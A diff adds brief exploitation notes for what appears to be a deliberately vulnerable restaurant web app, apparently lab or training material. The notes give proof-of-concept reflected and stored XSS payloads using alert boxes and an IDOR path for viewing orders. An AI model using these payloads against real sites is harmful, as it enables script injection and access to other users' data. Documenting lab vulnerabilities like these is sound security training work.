@@ -1,0 +1,12 @@
+1. reflected xss
+in restraunt tab do
+<script>alert('xss')</script> and hit search
+then modify the path from 'restraunt' to 'form'
+
+2. stored xss
+in profile do
+<img src='#' onerror="alert('xss')">
+
+3. idor
+type this below path after ip:port
+/orders/1
